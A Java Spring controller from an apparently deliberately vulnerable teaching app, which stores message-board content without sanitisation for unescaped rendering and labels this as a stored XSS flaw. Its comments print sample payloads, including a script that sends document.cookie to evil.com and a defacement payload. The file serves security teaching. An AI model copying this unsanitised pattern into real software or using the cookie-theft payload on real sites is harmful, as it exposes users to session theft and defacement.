package com.vulnerable.app.controller;

import com.vulnerable.app.model.Message;
import com.vulnerable.app.repository.MessageRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

/**
 * ⚠️ VULNERABILITY #2: Cross-Site Scripting (XSS)
 *
 * Message content is stored as-is and rendered unescaped in the template.
 * Attacker can inject JavaScript that executes in every visitor's browser.
 */
@Controller
@RequestMapping("/messages")
@RequiredArgsConstructor
public class MessageController {

    private final MessageRepository messageRepository;

    /**
     * Renders the message board — uses th:utext (unescaped) in the template,
     * so any HTML/JS in message content executes directly.
     */
    @GetMapping
    public String getMessages(Model model) {
        List<Message> messages = messageRepository.findAll();
        model.addAttribute("messages", messages);
        return "messages";
    }

    /**
     * ⚠️ VULNERABILITY: Message content stored without sanitization.
     *
     * Attack payload stored and served to all users:
     *   { "author": "hacker", "content": "<script>alert('XSS')</script>" }
     *
     * Cookie theft payload:
     *   { "author": "hacker", "content":
     *     "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" }
     *
     * Defacement:
     *   { "author": "hacker", "content":
     *     "<img src=x onerror=\"document.body.innerHTML='<h1>Hacked</h1>'\">" }
     */
    @PostMapping("/api/messages")
    @ResponseBody
    public ResponseEntity<?> postMessage(@RequestBody Map<String, String> body) {
        String author  = body.getOrDefault("author", "anonymous");
        String content = body.get("content");

        if (content == null || content.isBlank()) {
            return ResponseEntity.badRequest().body(Map.of("error", "Content is required"));
        }

        // ⚠️ No sanitization — raw HTML stored as-is
        Message message = new Message(null, author, content);
        Message saved = messageRepository.save(message);

        return ResponseEntity.ok(saved);
    }

    /**
     * JSON endpoint for the SPA demo.
     */
    @GetMapping("/api/messages")
    @ResponseBody
    public ResponseEntity<List<Message>> getMessagesJson() {
        return ResponseEntity.ok(messageRepository.findAll());
    }
}
